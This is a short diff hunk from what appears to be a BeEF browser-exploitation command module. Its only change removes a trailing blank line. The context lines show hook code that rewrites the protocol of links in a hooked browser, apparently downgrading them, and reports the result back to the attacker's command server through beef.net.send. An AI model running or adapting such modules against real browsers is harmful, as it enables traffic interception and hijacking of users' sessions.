@@ -13,4 +13,3 @@ beef.execute(function() {
 	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result='+beef.dom.rewriteLinksProtocol(old_protocol, new_protocol, selector)+' '+old_protocol+' links rewritten to '+new_protocol);
 
 });
-
